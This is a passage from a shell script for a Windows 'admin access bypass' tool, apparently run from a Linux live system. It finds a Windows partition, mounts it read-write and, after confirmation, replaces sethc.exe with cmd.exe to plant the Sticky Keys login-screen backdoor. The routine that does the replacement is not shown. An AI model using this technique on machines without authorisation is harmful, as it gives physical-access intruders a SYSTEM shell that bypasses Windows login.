    [ -z "$device" ] && continue
    
    # Only include partitions (those with numbers at the end)
    if echo "$device" | grep -q '[0-9]$'; then
        PARTITIONS="$PARTITIONS /dev/$device"
    fi
done < /proc/partitions

if [ -z "$PARTITIONS" ]; then
    error "No partitions found!"
    echo ""
    echo "Raw /proc/partitions content:"
    cat /proc/partitions
    exit 1
fi

log "Found partitions to check:"
for partition in $PARTITIONS; do
    if [ -b "$partition" ]; then
        echo "  - $partition ✓"
    else
        echo "  - $partition ✗ (not found)"
    fi
done

echo ""
WINDOWS_PARTITION=""
PARTITION_COUNT=0

# Check each partition
for partition in $PARTITIONS; do
    PARTITION_COUNT=$((PARTITION_COUNT + 1))
    
    # Skip if device doesn't exist
    if [ ! -b "$partition" ]; then
        warning "Skipping $partition (device not found)"
        continue
    fi
    
    echo -e "${CYAN}=== Checking partition $PARTITION_COUNT: $partition ===${NC}"
    
    if check_windows_partition "$partition"; then
        WINDOWS_PARTITION="$partition"
        success "Windows partition found: $partition"
        break
    else
        info "Not a Windows partition: $partition"
    fi
    echo ""
done

# If no Windows partition found, clean up mount point
if [ -z "$WINDOWS_PARTITION" ]; then
    safe_unmount
fi

if [ -z "$WINDOWS_PARTITION" ]; then
    error "No Windows partition found!"
    echo ""
    echo "Checked partitions:"
    for partition in $PARTITIONS; do
        if [ -b "$partition" ]; then
            echo "  - $partition (checked, not Windows)"
        else
            echo "  - $partition (skipped, device not found)"
        fi
    done
    echo ""
    echo -e "${YELLOW}Troubleshooting:${NC}"
    echo -e "${YELLOW}1. Try: getadmin --force --delete-hiberfil${NC}"
    echo -e "${YELLOW}2. Make sure Windows partitions are not encrypted (BitLocker)${NC}"
    echo -e "${YELLOW}3. Try running 'getdrives' to see available partitions${NC}"
    echo -e "${YELLOW}4. Try manually: mount -t ntfs3 -o rw,force /dev/sdXY /mnt${NC}"
    # Cleanup before exit
    rmdir "$MOUNT_POINT" 2>/dev/null || true
    exit 1
fi

# Ask for confirmation
echo ""
echo -e "${YELLOW}=============================================${NC}"
echo -e "${YELLOW}          CONFIRMATION REQUIRED             ${NC}"
echo -e "${YELLOW}=============================================${NC}"
echo ""
echo -e "${RED}WARNING: This will modify Windows system files!${NC}"
echo -e "${RED}This action will replace sethc.exe with cmd.exe${NC}"
echo -e "${RED}Target Windows partition: $WINDOWS_PARTITION${NC}"
if [ "$USE_FORCE" -eq 1 ]; then
    echo -e "${YELLOW}Mount options: rw,force${NC}"
else
    echo -e "${BLUE}Mount options: rw${NC}"
fi
if [ "$DELETE_HIBERFIL" -eq 1 ]; then
    echo -e "${YELLOW}Hibernation file: Will be deleted if found${NC}"
else
    echo -e "${BLUE}Hibernation file: Will be preserved${NC}"
fi
echo ""
echo -e "${YELLOW}Continue? (Type 'YES' to proceed): ${NC}"
read -r CONFIRM

if [ "$CONFIRM" != "YES" ]; then
    warning "Operation cancelled by user"
    safe_unmount
    # Cleanup before exit
    rmdir "$MOUNT_POINT" 2>/dev/null || true
    exit 0
fi

# Perform the bypass
if perform_bypass "$WINDOWS_PARTITION"; then
    success "Windows admin access bypass operation completed!"
    
    # Handle post-completion actions (power off or continue)
    handle_completion
    
else
    error "Failed to perform bypass!"
    # Cleanup on failure
    safe_unmount
    rmdir "$MOUNT_POINT" 2>/dev/null || true
    exit 1
fi
